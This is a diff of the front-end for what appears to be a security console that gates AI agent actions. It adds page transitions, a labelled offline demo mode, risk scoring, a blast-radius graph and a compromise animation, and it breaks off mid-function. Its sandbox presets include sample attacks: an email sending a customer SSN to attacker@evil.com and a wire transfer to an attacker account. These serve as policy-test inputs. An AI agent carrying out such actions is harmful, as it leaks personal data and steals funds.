@@ -137,10 +137,12 @@ body {
   position: relative;
   background: var(--bg-dark);
   overflow-x: hidden;
-  transition: opacity .5s, transform .5s;
+  transition: opacity .32s ease, transform .32s ease;
 }
 #lp.out {
-  display: none;
+  opacity: 0;
+  transform: scale(.98);
+  pointer-events: none;
 }
 
 /* AMBIENT BACKGROUND GLOW */
@@ -1330,9 +1332,16 @@ html.in-console {
   height: 100vh;
   overflow: hidden;
   background: var(--bg-dark);
+  opacity: 0;
+  transform: scale(1.01);
+  transition: opacity .32s ease, transform .32s ease;
 }
 #app.on {
   display: flex;
+}
+#app.on.in {
+  opacity: 1;
+  transform: scale(1);
 }
 
 /* CONSOLE HEADER */
@@ -1876,6 +1885,11 @@ select.fc2 { cursor: pointer; }
 }
 .ai:last-child { border-bottom: none; }
 .ai:hover { background: rgba(255, 255, 255, 0.02); }
+@keyframes aiSlideIn {
+  from { opacity: 0; transform: translateY(-8px); background: rgba(249,87,42,0.12); }
+  to   { opacity: 1; transform: translateY(0); background: transparent; }
+}
+.ai-new { animation: aiSlideIn .6s ease both; }
 .adot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
 .adot.ALLOW { background: var(--ok); box-shadow: 0 0 6px var(--ok); }
 .adot.DENY { background: var(--dn); box-shadow: 0 0 6px var(--dn); }
@@ -2645,7 +2659,7 @@ select.fc2 { cursor: pointer; }
                 </div>
                 <div class="g2" style="gap:9px">
                   <div class="fg"><label class="fl">Resource ID</label><input type="text" id="sbres" class="fc2" value="ch_44192"/></div>
-                  <div class="fg"><label class="fl">Sensitivity</label><select id="sbsens" class="fc2"><option>LOW</option><option>MEDIUM</option><option selected>HIGH</option><option>CRITICAL</option><option>CONFIDENTIAL</option></select></div>
+                  <div class="fg"><label class="fl">Sensitivity</label><select id="sbsens" class="fc2"><option>PUBLIC</option><option>INTERNAL</option><option>CONFIDENTIAL</option><option selected>SENSITIVE</option><option>CRITICAL</option></select></div>
                 </div>
                 <div class="fg"><label class="fl">Parameters (JSON)</label><textarea id="sbparams" class="fc2" style="height:76px">{"chargeId": "ch_44192", "amount": 50, "reason": "customer_requested"}</textarea></div>
                 <div style="display:flex;gap:8px">
@@ -2729,22 +2743,29 @@ select.fc2 { cursor: pointer; }
           <div class="pb" style="padding:18px">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
               <div><h2>&#128165; Blast Radius &amp; Lateral Attack Graph</h2><p style="font-size:11px;color:var(--ts);margin-top:2px">Visualize compromised agent exposure, resource leakage, and lateral movement paths</p></div>
-              <div style="display:flex;gap:8px"><select id="blastagt" class="fc2" style="width:215px" onchange="computeBlast()"><option value="agent_finance_refund">agent_finance_refund</option><option value="agent_support_general">agent_support_general</option><option value="agent_infra_devops">agent_infra_devops</option></select><button class="btn bp bsm" onclick="computeBlast()">Compute</button></div>
+              <div style="display:flex;gap:8px"><select id="blastagt" class="fc2" style="width:215px" onchange="computeBlast()"><option value="agent_finance_refund">agent_finance_refund</option><option value="agent_support_general">agent_support_general</option><option value="agent_infra_devops">agent_infra_devops</option></select><button class="btn bse bsm" onclick="computeBlast()">Compute</button><button class="btn bp bsm" id="btnCompromise" onclick="simulateCompromise()">&#9762; Simulate Compromise</button></div>
             </div>
             <div class="g3" style="margin-bottom:14px">
-              <div class="kc"><div class="kt">Criticality Score</div><div class="kv" id="bltcrit" style="color:var(--dn)">HIGH</div><div class="ks2" id="bltcritp" style="color:var(--tm)">Production ops</div></div>
+              <div class="kc"><div class="kt">Risk Class</div><div class="kv" id="bltcrit" style="color:var(--dn)">HIGH</div><div class="ks2" id="bltcritp" style="color:var(--tm)">Production ops</div></div>
               <div class="kc"><div class="kt">Max Financial Exposure</div><div class="kv" id="bltmoney" style="color:var(--wa)">$10,000</div><div class="ks2" style="color:var(--tm)">Hard delegation ceiling</div></div>
-              <div class="kc"><div class="kt">Reachable Agent Nodes</div><div class="kv" id="bltnodes" style="color:var(--accent-orange)">2</div><div class="ks2" style="color:var(--tm)">Sub-delegation graph</div></div>
+              <div class="kc"><div class="kt">Reachable Nodes</div><div class="kv" id="bltnodes" style="color:var(--accent-orange)">2</div><div class="ks2" style="color:var(--tm)">Tools + resources + agents</div></div>
             </div>
             <div class="g2">
               <div>
-                <div style="font-size:12px;font-weight:700;margin-bottom:7px">Force-Directed Blast Graph</div>
+                <div style="font-size:12px;font-weight:700;margin-bottom:7px">Reachability Graph</div>
                 <canvas id="blastcv" style="width:100%;border-radius:7px;background:rgba(0,0,0,.4);border:1px solid var(--b);display:block" height="270"></canvas>
-                <div style="font-size:10px;color:var(--tm);margin-top:5px;display:flex;gap:10px"><span>&#128308; CRITICAL</span><span>&#128993; HIGH</span><span>&#128997; MEDIUM</span><span>&#128994; Resource</span></div>
+                <div style="font-size:10px;color:var(--tm);margin-top:5px;display:flex;gap:10px"><span>&#128308; Agent</span><span>&#128993; Tool</span><span>&#128997; Resource</span><span>&#128994; Lateral Agent</span></div>
               </div>
               <div style="display:flex;flex-direction:column;gap:11px">
                 <div><div style="font-size:12px;font-weight:700;margin-bottom:5px">Accessible Sensitive Resources</div><div id="bltres" class="codebox" style="min-height:110px;max-height:140px;overflow-y:auto">Select an agent to compute...</div></div>
-                <div><div style="font-size:12px;font-weight:700;margin-bottom:5px">Dijkstra Lateral Attack Paths</div><div id="bltpaths" class="codebox" style="min-height:80px;max-height:100px;overflow-y:auto">Select an agent to compute...</div></div>
+                <div><div style="font-size:12px;font-weight:700;margin-bottom:5px">Lateral Attack Paths</div><div id="bltpaths" class="codebox" style="min-height:80px;max-height:100px;overflow-y:auto">Select an agent to compute...</div></div>
+              </div>
+            </div>
+            <div id="compromiseTheater" style="display:none;margin-top:14px">
+              <div id="compromiseNarration" class="codebox" style="min-height:60px;font-size:12.5px;line-height:1.7"></div>
+              <div id="compromiseVerdict" style="display:none;margin-top:11px;padding:16px;border-radius:10px;border:1px solid rgba(239,68,68,0.4);background:rgba(239,68,68,0.06);animation:aiSlideIn .5s ease both">
+                <div style="font-size:10px;font-weight:800;letter-spacing:.08em;color:#f87171;text-transform:uppercase;margin-bottom:8px">&#9888; Compromise Impact Assessment</div>
+                <div id="compromiseVerdictBody" style="font-size:13px;line-height:1.7"></div>
               </div>
             </div>
           </div>
@@ -2781,7 +2802,7 @@ select.fc2 { cursor: pointer; }
               </div>
               <div class="fg" style="margin-bottom:9px"><label class="fl">Policy Source</label><textarea id="pdsl" class="fc2" style="height:190px;font-family:var(--m);background:#070402;font-size:12.5px">POLICY refund_approval_safety
 ALLOW stripe_refund
-WHEN NOT resource.sensitivity == "RESTRICTED"
+WHEN NOT resource.sensitivity == "CRITICAL"
   AND amount &lt;= 5000
   OR workflow.state == "APPROVED"
 REQUIRE_APPROVAL_ABOVE 2500</textarea></div>
@@ -2927,7 +2948,9 @@ const S = {
   blastAgt: 'agent_finance_refund',
   ivs: {},
   loaded: new Set(),
-  activeStep: 1
+  activeStep: 1,
+  offline: false,
+  demoUptimeStart: null
 };
 const TRI = { overview: 3000, telemetry: 5000, approvals: 3000, ledger: 10000 };
 
@@ -2947,23 +2970,33 @@ const POST = (p, b) => api('POST', p, b);
 function enterConsole() {
   document.documentElement.classList.add("in-console");
   const lp = document.getElementById('lp');
+  const appEl = document.getElementById('app');
   lp.classList.add('out');
-  document.getElementById('app').classList.add('on');
   initApp();
-  window.scrollTo(0, 0);
+  setTimeout(() => {
+    lp.style.display = 'none';
+    window.scrollTo(0, 0);
+    appEl.classList.add('on');
+    requestAnimationFrame(() => requestAnimationFrame(() => appEl.classList.add('in')));
+  }, 320);
 }
 
 function enterConsoleAt(tab) {
   enterConsole();
-  setTimeout(() => sw(tab), 100);
+  setTimeout(() => sw(tab), 420);
 }
 
 function showLanding() {
   document.documentElement.classList.remove("in-console");
   const lp = document.getElementById('lp');
-  lp.classList.remove('out');
-  document.getElementById('app').classList.remove('on');
-  window.scrollTo(0, 0);
+  const appEl = document.getElementById('app');
+  appEl.classList.remove('in');
+  setTimeout(() => {
+    appEl.classList.remove('on');
+    lp.style.display = '';
+    lp.classList.remove('out');
+    window.scrollTo(0, 0);
+  }, 320);
 }
 
 async function initApp() {
@@ -2981,6 +3014,7 @@ async function initApp() {
 async function loadStatus() {
   try {
     const s = await GET('/api/v1/status');
+    S.offline = false;
     document.getElementById('upbadge').textContent = 'Uptime: ' + fmtUp(s.uptimeSeconds);
     document.getElementById('kpitot').textContent = s.totalActions;
     document.getElementById('kpihold').textContent = s.pendingApprovals;
@@ -3001,7 +3035,9 @@ async function loadStatus() {
       b.style.display = 'inline';
       b.textContent = s.pendingApprovals;
     } else b.style.display = 'none';
-  } catch (e) {}
+  } catch (e) {
+    enterOfflineDemoMode();
+  }
 }
 
 function sw(tab) {
@@ -3092,13 +3128,13 @@ async function loadActivity() {
   }
 }
 
-function renderActivity(acts) {
+function renderActivity(acts, highlightNewest) {
   const el = document.getElementById('actstream');
   if (!acts.length) {
     el.innerHTML = '<div style="padding:30px;text-align:center;color:var(--tm);font-size:12px">Dispatch actions in the Sandbox to see live feed here</div>';
     return;
   }
-  el.innerHTML = acts.map(a => `<div class="ai" onclick="openActDetail('${a.actionId}')">
+  el.innerHTML = acts.map((a, i) => `<div class="ai${highlightNewest && i === 0 ? ' ai-new' : ''}" onclick="openActDetail('${a.actionId}')">
     <div class="adot ${a.decision}"></div>
     <div class="am2">
       <div class="aan">${a.agentId}</div>
@@ -3114,17 +3150,87 @@ function renderActivity(acts) {
 async function renderDecDist() {
   try {
     const acts = await GET('/api/v1/actions?limit=500');
-    const c = { ALLOW: 0, DENY: 0, HOLD: 0, OBSERVED: 0 };
-    acts.forEach(a => { if (c[a.decision] !== undefined) c[a.decision]++; });
-    const tot = Object.values(c).reduce((a, b) => a + b, 0);
-    const el = document.getElementById('decdist');
-    if (!tot) {
-      el.innerHTML = '<div style="color:var(--tm);font-size:12px;text-align:center;padding:36px 0">No decisions recorded yet</div>';
-      return;
-    }
-    const col = { ALLOW: '#10b981', DENY: '#ef4444', HOLD: '#f59e0b', OBSERVED: '#f9572a' };
-    el.innerHTML = `<div class="srbar" style="height:12px;border-radius:6px;margin-bottom:14px">${Object.entries(c).filter(([, v]) => v > 0).map(([k, v]) => `<div class="srbs" style="width:${(v / tot * 100).toFixed(1)}%;background:${col[k]}" title="${k}: ${v}"></div>`).join('')}</div>${Object.entries(c).filter(([, v]) => v > 0).map(([k, v]) => `<div style="display:flex;align-items:center;gap:8px;margin-bottom:7px"><div style="width:10px;height:10px;border-radius:50%;background:${col[k]};flex-shrink:0"></div><span style="color:var(--ts);flex:1;font-size:12px">${k}</span><span style="font-weight:700;font-family:var(--m)">${v}</span><span style="color:var(--tm);font-size:11px;font-family:var(--m)">(${(v / tot * 100).toFixed(0)}%)</span></div>`).join('')}<div style="font-size:11px;color:var(--tm);border-top:1px solid var(--b);padding-top:8px;margin-top:4px;display:flex;justify-content:space-between"><span>Total</span><span style="font-family:var(--m);font-weight:700">${tot}</span></div>`;
-  } catch (e) {}
+    renderDecDistFromActions(acts);
+  } catch (e) {
+    renderDecDistFromActions(S.actions);
+  }
+}
+
+function renderDecDistFromActions(acts) {
+  const c = { ALLOW: 0, DENY: 0, HOLD: 0, OBSERVED: 0 };
+  acts.forEach(a => { if (c[a.decision] !== undefined) c[a.decision]++; });
+  const tot = Object.values(c).reduce((a, b) => a + b, 0);
+  const el = document.getElementById('decdist');
+  if (!tot) {
+    el.innerHTML = '<div style="color:var(--tm);font-size:12px;text-align:center;padding:36px 0">No decisions recorded yet</div>';
+    return;
+  }
+  const col = { ALLOW: '#10b981', DENY: '#ef4444', HOLD: '#f59e0b', OBSERVED: '#f9572a' };
+  el.innerHTML = `<div class="srbar" style="height:12px;border-radius:6px;margin-bottom:14px">${Object.entries(c).filter(([, v]) => v > 0).map(([k, v]) => `<div class="srbs" style="width:${(v / tot * 100).toFixed(1)}%;background:${col[k]}" title="${k}: ${v}"></div>`).join('')}</div>${Object.entries(c).filter(([, v]) => v > 0).map(([k, v]) => `<div style="display:flex;align-items:center;gap:8px;margin-bottom:7px"><div style="width:10px;height:10px;border-radius:50%;background:${col[k]};flex-shrink:0"></div><span style="color:var(--ts);flex:1;font-size:12px">${k}</span><span style="font-weight:700;font-family:var(--m)">${v}</span><span style="color:var(--tm);font-size:11px;font-family:var(--m)">(${(v / tot * 100).toFixed(0)}%)</span></div>`).join('')}<div style="font-size:11px;color:var(--tm);border-top:1px solid var(--b);padding-top:8px;margin-top:4px;display:flex;justify-content:space-between"><span>Total</span><span style="font-family:var(--m);font-weight:700">${tot}</span></div>`;
+}
+
+/* ============ OFFLINE DEMO MODE (no reachable /api backend, e.g. static hosting) ============
+   Honestly-labeled simulated telemetry so the dashboard never reads as dead on a static deploy. */
+const DEMO_SCENARIOS = [
+  { agentId: 'agent_finance_refund', tool: 'stripe_refund', resourceId: 'ch_2381', decision: 'ALLOW' },
+  { agentId: 'agent_finance_refund', tool: 'stripe_refund', resourceId: 'ch_7742', decision: 'ALLOW' },
+  { agentId: 'agent_finance_refund', tool: 'search_customers', resourceId: 'cust_9910', decision: 'ALLOW' },
+  { agentId: 'agent_support_general', tool: 'search_customers', resourceId: 'cust_4471', decision: 'ALLOW' },
+  { agentId: 'agent_support_general', tool: 'send_external_email', resourceId: 'cust_1120', decision: 'DENY' },
+  { agentId: 'agent_finance_refund', tool: 'stripe_refund', resourceId: 'ch_8834', decision: 'HOLD' },
+  { agentId: 'agent_infra_devops', tool: 'deploy_container', resourceId: 'k8s:staging-2', decision: 'ALLOW' },
+  { agentId: 'agent_infra_devops', tool: 'modify_security_group', resourceId: 'sg:prod-vpc', decision: 'HOLD' },
+  { agentId: 'agent_support_general', tool: 'send_wire_transfer', resourceId: 'acct_ext_991', decision: 'DENY' },
+  { agentId: 'agent_finance_refund', tool: 'stripe_refund', resourceId: 'ch_5563', decision: 'ALLOW' }
+];
+let demoActionSeq = 0;
+function genDemoAction(secondsAgo) {
+  const sc = DEMO_SCENARIOS[Math.floor(Math.random() * DEMO_SCENARIOS.length)];
+  return {
+    actionId: 'act_demo_' + (demoActionSeq++),
+    agentId: sc.agentId,
+    tool: sc.tool,
+    resourceId: sc.resourceId,
+    decision: sc.decision,
+    timestamp: new Date(Date.now() - secondsAgo * 1000).toISOString()
+  };
+}
+
+let demoModeActive = false;
+function enterOfflineDemoMode() {
+  S.offline = true;
+  if (demoModeActive) return;
+  demoModeActive = true;
+
+  const ld = document.querySelector('.ldot');
+  if (ld) { ld.textContent = 'SIMULATED'; ld.title = 'No live control-plane backend reachable from this static deployment — showing simulated demo telemetry.'; }
+
+  if (S.actions.length === 0) {
+    S.actions = Array.from({ length: 9 }, (_, i) => genDemoAction(30 + i * 47)).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+    renderActivity(S.actions);
+    renderDecDistFromActions(S.actions);
+    document.getElementById('kpitot').textContent = S.actions.length;
+    document.getElementById('kpihold').textContent = S.actions.filter(a => a.decision === 'HOLD').length;
+  }
+
+  if (!S.demoUptimeStart) {
+    S.demoUptimeStart = Date.now();
+    setInterval(() => {
+      const badge = document.getElementById('upbadge');
+      if (badge) badge.textContent = 'Uptime: ' + fmtUp(Math.floor((Date.now() - S.demoUptimeStart) / 1000)) + ' (demo)';
+    }, 1000);
+  }
+
+  setInterval(() => {
+    if (S.tab !== 'overview') return;
+    const a = genDemoAction(0);
+    S.actions.unshift(a);
+    S.actions = S.actions.slice(0, 40);
+    renderActivity(S.actions.slice(0, 14), true);
+    renderDecDistFromActions(S.actions);
+    document.getElementById('kpitot').textContent = S.actions.length;
+    document.getElementById('kpihold').textContent = S.actions.filter(x => x.decision === 'HOLD').length;
+  }, 6000 + Math.random() * 4000);
 }
 
 function dKey(d) {
@@ -3132,8 +3238,8 @@ function dKey(d) {
 }
 
 const PRESETS = {
-  refund_legitimate: { a: 'agent_finance_refund', t: 'stripe_refund', r: 'ch_44192', s: 'HIGH', p: '{"chargeId":"ch_44192","amount":50,"reason":"customer_requested"}' },
-  refund_high_value: { a: 'agent_finance_refund', t: 'stripe_refund', r: 'ch_99871', s: 'HIGH', p: '{"chargeId":"ch_99871","amount":3500,"reason":"executive_override"}' },
+  refund_legitimate: { a: 'agent_finance_refund', t: 'stripe_refund', r: 'ch_44192', s: 'SENSITIVE', p: '{"chargeId":"ch_44192","amount":50,"reason":"customer_requested"}' },
+  refund_high_value: { a: 'agent_finance_refund', t: 'stripe_refund', r: 'ch_99871', s: 'SENSITIVE', p: '{"chargeId":"ch_99871","amount":3500,"reason":"executive_override"}' },
   pii_exfil: { a: 'agent_support_general', t: 'send_external_email', r: 'cust_887123', s: 'CONFIDENTIAL', p: '{"to":"attacker@evil.com","subject":"Customer Data","body":"SSN: 123-45-6789"}' },
   unauthorized_wire: { a: 'agent_support_general', t: 'send_wire_transfer', r: 'acct_external_001', s: 'CRITICAL', p: '{"amount":10000,"destinationAccount":"IBAN_ATTACKER","memo":"urgent"}' },
   devops_deploy: { a: 'agent_infra_devops', t: 'deploy_container', r: 'k8s:prod-cluster-1', s: 'CRITICAL', p: '{"image":"myapp:v2.1.4","namespace":"production","replicas":3}' }
@@ -3226,13 +3332,23 @@ async function dispatchAction() {
 }
 
 function simDecision(req) {
-  const rm = { CRITICAL: 90, CONFIDENTIAL: 75, HIGH: 50, MEDIUM: 30, LOW: 15 };
-  const risk = rm[req.resource.sensitivity] || 30;
+  // Mirrors the resource-sensitivity weighting in packages/policy-engine/src/index.ts calculateRisk()
+  const rm = { PUBLIC: 5, INTERNAL: 20, CONFIDENTIAL: 45, SENSITIVE: 70, CRITICAL: 90 };
+  let risk = rm[req.resource.sensitivity] ?? 25;
+  const amount = typeof req.parameters?.amount === 'number' ? req.parameters.amount : 0;
+  if (amount > 0) {
+    if (amount <= 100) risk = Math.max(risk, 20);
+    else if (amount <= 500) risk = Math.max(risk, 40);
+    else if (amount <= 2500) risk = Math.max(risk, 75);
+    else risk = Math.max(risk, 95);
+  }
+  if (req.resource.environment === 'production') risk = Math.min(100, risk + 15);
   const dec = risk >= 80 ? 'DENY' : risk >= 60 ? 'HOLD' : 'ALLOW';
+  const riskClass = risk >= 90 ? 'CRITICAL' : risk >= 60 ? 'HIGH' : risk >= 30 ? 'MEDIUM' : 'LOW';
   return {
     decision: dec,
     riskScore: risk,
-    riskClass: req.resource.sensitivity,
+    riskClass,
     explanation: `Risk score ${risk} &rarr; ${dec}`,
     grant: dec === 'ALLOW' ? { grantId: 'grant_sim_' + Date.now(), status: 'VALID' } : null
   };
@@ -3435,7 +3551,7 @@ async function genHold() {
   document.getElementById('sbagt').value = 'agent_finance_refund';
   document.getElementById('sbtool').value = 'stripe_refund';
   document.getElementById('sbres').value = 'ch_hold_' + Date.now();
-  document.getElementById('sbsens').value = 'HIGH';
+  document.getElementById('sbsens').value = 'SENSITIVE';
   document.getElementById('sbparams').value = JSON.stringify({ chargeId: 'ch_hold_' + Date.now(), amount: 3500, reason: 'executive_override' });
   sw('sandbox');
   setTimeout(dispatchAction, 100);
@@ -3580,6 +3696,8 @@ function termLog(pfx, msg) {
 async function computeBlast() {
   const agt = document.getElementById('blastagt').value;
   S.blastAgt = agt;
+  document.getElementById('compromiseTheater').style.display = 'none';
+  document.getElementById('compromiseVerdict').style.display = 'none';
   try {
     const d = await POST('/api/v1/simulate/agent', { agentId: agt });
     renderBlast(d, agt);
@@ -3588,60 +3706,94 @@ async function computeBlast() {
   }
 }
 
+/** Normalizes a real BlastRadiusReport (or the demo fallback shape) into one consistent shape for rendering. */
+function normalizeBlast(br) {
+  const tools = (br.reachableTools || []).map(t => typeof t === 'string' ? { tool: t, risk: 'MEDIUM' } : t);
+  const resources = (br.reachableResources || []).map(r => typeof r === 'string' ? { resourceType: r, sensitivity: 'CONFIDENTIAL', countEstimate: 1 } : r);
+  return {
+    riskClass: br.riskClass || 'MEDIUM',
+    maxExposure: br.maximumFinancialExposure || 0,
+    reachableAgents: br.reachableAgents || [],
+    tools,
+    resources,
+    escalationPaths: br.privilegeEscalationPaths || []
+  };
+}
+
 function renderBlast(d, agt) {
-  const br = d.blastRadius, paths = d.attackPaths;
-  document.getElementById('bltcrit').textContent = br?.criticalityScore || 'HIGH';
-  document.getElementById('bltcritp').textContent = br?.environment || 'production';
-  document.getElementById('bltmoney').textContent = br?.maximumFinancialExposure ? '$' + br.maximumFinancialExposure.toLocaleString() : '$10,000';
-  document.getElementById('bltnodes').textContent = (br?.reachableAgents?.length || 0) + ' nodes';
-  const res = br?.sensitiveResources || br?.reachableTools || [];
-  document.getElementById('bltres').textContent = res.length ? res.join('\n') : 'No resources beyond direct delegation';
+  const br = normalizeBlast(d.blastRadius || {});
+  const paths = d.attackPaths || [];
+  document.getElementById('bltcrit').textContent = br.riskClass;
+  document.getElementById('bltcritp').textContent = br.reachableAgents.length + ' reachable agent(s)';
+  document.getElementById('bltmoney').textContent = '$' + br.maxExposure.toLocaleString();
+  document.getElementById('bltnodes').textContent = br.tools.length + br.resources.length + br.reachableAgents.length;
+  const resEl = document.getElementById('bltres');
+  resEl.innerHTML = br.resources.length
+    ? br.resources.map(r => `<div>${r.resourceType} <span style="color:var(--tm)">[${r.sensitivity}]</span></div>`).join('')
+    : 'No resources beyond direct delegation';
   const pel = document.getElementById('bltpaths');
-  if (paths && paths.length > 0) {
-    pel.innerHTML = paths.map(p => `<div style="margin-bottom:5px">&rarr; ${Array.isArray(p) ? p.join(' &rarr; ') : JSON.stringify(p)}</div>`).join('');
-  } else {
-    pel.textContent = 'No lateral attack paths detected from this agent';
-  }
-  drawBlast(agt, br, paths || []);
+  pel.innerHTML = paths.length
+    ? paths.map(p => `<div style="margin-bottom:6px">${p.sourceAgent} &rarr; <b>${p.tool}</b> &rarr; ${p.targetResource} <span class="badge b${dKey(p.riskLevel)}" style="margin-left:4px;font-size:9px;padding:1px 6px">${p.riskLevel}</span></div>`).join('')
+    : 'No lateral attack paths detected from this agent';
+  S.lastBlast = { agt, br, paths };
+  drawBlast(agt, br, paths, { stage: 3 });
 }
 
 const BFB = {
-  agent_finance_refund: { criticalityScore: 'HIGH', maximumFinancialExposure: 10000, reachableAgents: ['sponsor'], sensitiveResources: ['stripe:*', 'ch:*', 'cust:*'] },
-  agent_support_general: { criticalityScore: 'MEDIUM', maximumFinancialExposure: 0, reachableAgents: [], sensitiveResources: ['cust:*', 'pii:*'] },
-  agent_infra_devops: { criticalityScore: 'CRITICAL', maximumFinancialExposure: 0, reachableAgents: [], sensitiveResources: ['k8s:*', 'sg:*', 'db:*'] }
+  agent_finance_refund: { riskClass: 'HIGH', maximumFinancialExposure: 10000, reachableAgents: ['user_ciso_jane'], reachableTools: [{ tool: 'stripe_refund', risk: 'HIGH' }, { tool: 'search_customers', risk: 'LOW' }], reachableResources: [{ resourceType: 'stripe:*', sensitivity: 'SENSITIVE' }, { resourceType: 'cust:*', sensitivity: 'CONFIDENTIAL' }] },
+  agent_support_general: { riskClass: 'MEDIUM', maximumFinancialExposure: 0, reachableAgents: [], reachableTools: [{ tool: 'search_customers', risk: 'LOW' }, { tool: 'read_customer_pii', risk: 'MEDIUM' }], reachableResources: [{ resourceType: 'cust:*', sensitivity: 'CONFIDENTIAL' }, { resourceType: 'pii:*', sensitivity: 'SENSITIVE' }] },
+  agent_infra_devops: { riskClass: 'CRITICAL', maximumFinancialExposure: 0, reachableAgents: [], reachableTools: [{ tool: 'deploy_container', risk: 'HIGH' }, { tool: 'modify_security_group', risk: 'CRITICAL' }], reachableResources: [{ resourceType: 'k8s:*', sensitivity: 'CRITICAL' }, { resourceType: 'sg:*', sensitivity: 'CRITICAL' }] }
 };
 
 function renderBlastFB(agt) {
-  const br = BFB[agt] || BFB.agent_finance_refund;
-  document.getElementById('bltcrit').textContent = br.criticalityScore;
-  document.getElementById('bltmoney').textContent = '$' + br.maximumFinancialExposure.toLocaleString();
-  document.getElementById('bltnodes').textContent = br.reachableAgents.length + ' nodes';
-  document.getElementById('bltres').textContent = br.sensitiveResources.join('\n');
+  const br = normalizeBlast(BFB[agt] || BFB.agent_finance_refund);
+  document.getElementById('bltcrit').textContent = br.riskClass;
+  document.getElementById('bltcritp').textContent = br.reachableAgents.length + ' reachable agent(s)';
+  document.getElementById('bltmoney').textContent = '$' + br.maxExposure.toLocaleString();
+  document.getElementById('bltnodes').textContent = br.tools.length + br.resources.length + br.reachableAgents.length;
+  document.getElementById('bltres').innerHTML = br.resources.map(r => `<div>${r.resourceType} <span style="color:var(--tm)">[${r.sensitivity}]</span></div>`).join('');
   document.getElementById('bltpaths').textContent = 'No lateral paths (isolated delegation)';
-  drawBlast(agt, br, []);
+  S.lastBlast = { agt, br, paths: [] };
+  drawBlast(agt, br, [], { stage: 3 });
 }
 
-function drawBlast(agt, br, paths) {
+/**
+ * Renders the reachability graph in progressive "reveal" stages so simulateCompromise()
+ * can animate a compromise spreading outward: 0 = agent only, 1 = + tools ring,
+ * 2 = + resources ring, 3 = + lateral-agent ring (fully revealed, the default for a plain "Compute").
+ */
+function drawBlast(agt, br, paths, opts) {
+  const stage = (opts && opts.stage) ?? 3;
+  const pulse = opts && opts.pulse;
   const cv = document.getElementById('blastcv');
   if (!cv) return;
   const p = cv.parentElement.getBoundingClientRect();
   if (p.width === 0) {
-    setTimeout(() => drawBlast(agt, br, paths), 60);
+    setTimeout(() => drawBlast(agt, br, paths, opts), 60);
     return;
   }
   cv.width = p.width;
-  cv.height = 270;
+  cv.height = 300;
   const ctx = cv.getContext('2d');
   ctx.clearRect(0, 0, cv.width, cv.height);
   const cx = cv.width / 2, cy = cv.height / 2;
   const critc = { CRITICAL: '#ef4444', HIGH: '#f9572a', MEDIUM: '#e59324', LOW: '#10b981' };
-  const mc = critc[br?.criticalityScore] || '#f9572a';
-  const nodes = [{ x: cx, y: cy, l: agt.replace('agent_', ''), c: mc, r: 26, t: 'A' }];
-  const res = (br?.sensitiveResources || ['stripe:*', 'cust:*']).slice(0, 7);
-  res.forEach((r, i) => {
-    const ang = (i / res.length) * Math.PI * 2 - Math.PI / 2, dist = 105;
-    nodes.push({ x: cx + Math.cos(ang) * dist, y: cy + Math.sin(ang) * dist, l: r.slice(0, 13), c: '#f9572a', r: 16, t: 'R' });
-  });
+  const mc = pulse ? '#ef4444' : (critc[br?.riskClass] || '#f9572a');
+  const maxR = Math.max(60, Math.min(cx, cy) - 36);
+  const agentR = pulse ? 30 + Math.sin(Date.now() / 180) * 4 : 26;
+  const nodes = [{ x: cx, y: cy, l: agt.replace('agent_', ''), c: mc, r: agentR, t: 'A' }];
+
+  const ring = (items, radiusFrac, color, rr, label) => {
+    if (!items.length) return;
+    const dist = maxR * radiusFrac;
+    items.slice(0, 8).forEach((it, i) => {
+      const ang = (i / items.length) * Math.PI * 2 - Math.PI / 2;
+      nodes.push({ x: cx + Math.cos(ang) * dist, y: cy + Math.sin(ang) * dist, l: (it.tool || it.resourceType || it).toString().split(':')[0].slice(0, 13), c: color, r: rr, t: label });
+    });
+  };
+  if (stage >= 1) ring(br.tools, 0.42, '#e59324', 15, 'T');
+  if (stage >= 2) ring(br.resources, 0.75, '#f9572a', 15, 'R');
+  if (stage >= 3) ring(br.reachableAgents, 1.0, '#10b981', 17, 'LA');
 
   ctx.setLineDash([4, 4]);
   ctx.strokeStyle = 'rgba(255, 255, 255, 0.12)';
@@ -3675,7 +3827,96 @@ function drawBlast(agt, br, paths) {
     ctx.font = `${n.t === 'A' ? 700 : 400} ${n.t === 'A' ? 11 : 9}px 'Plus Jakarta Sans', sans-serif`;
     ctx.textAlign = 'center';
     ctx.textBaseline = 'middle';
-    ctx.fillText(n.l.split(':')[0], n.x, n.y);
+    ctx.fillText(n.l, n.x, n.y);
+  });
+}
+
+/* ============ CINEMATIC COMPROMISE SIMULATOR ============
+   Animates a "what if this agent were compromised right now?" walkthrough:
+   the agent node pulses red while a typewriter narration reveals reachable
+   tools, then resources, then lateral agents in stages, ending in a dramatic
+   impact-assessment card. Purely a visualization of already-real blast-radius
+   data — no simulated numbers are invented, only the reveal is staged. */
+let compromiseAnimFrame = null;
+let compromiseRevealStage = 0;
+function pulseAgentNode(agt, br) {
+  cancelAnimationFrame(compromiseAnimFrame);
+  const tick = () => {
+    drawBlast(agt, br, [], { stage: compromiseRevealStage, pulse: true });
+    compromiseAnimFrame = requestAnimationFrame(tick);
+  };
+  tick();
+}
+function stopPulse() { cancelAnimationFrame(compromiseAnimFrame); compromiseAnimFrame = null; }
+
+/** Reveals `lines` one at a time (each carrying its own graph-reveal stage), then calls onDone. */
+function narrateLines(el, lines, onDone) {
+  el.innerHTML = '';
+  let i = 0;
+  function next() {
+    if (i >= lines.length) { onDone && onDone(); return; }
+    const line = document.createElement('div');
+    line.style.marginBottom = '6px';
+    line.innerHTML = lines[i].text;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+    if (lines[i].stage !== undefined) compromiseRevealStage = lines[i].stage;
+    i++;
+    setTimeout(next, 750);
+  }
+  next();
+}
+
+async function simulateCompromise() {
+  const agt = S.blastAgt || document.getElementById('blastagt').value;
+  const btn = document.getElementById('btnCompromise');
+  btn.disabled = true;
+  btn.textContent = 'Simulating...';
+
+  let br = S.lastBlast && S.lastBlast.agt === agt ? S.lastBlast.br : null;
+  let paths = S.lastBlast && S.lastBlast.agt === agt ? S.lastBlast.paths : [];
+  if (!br) {
+    try {
+      const d = await POST('/api/v1/simulate/agent', { agentId: agt });
+      br = normalizeBlast(d.blastRadius || {});
+      paths = d.attackPaths || [];
+    } catch (e) {
+      br = normalizeBlast(BFB[agt] || BFB.agent_finance_refund);
+      paths = [];
+    }
+    S.lastBlast = { agt, br, paths };
+  }
+
+  const theater = document.getElementById('compromiseTheater');
+  const narrEl = document.getElementById('compromiseNarration');
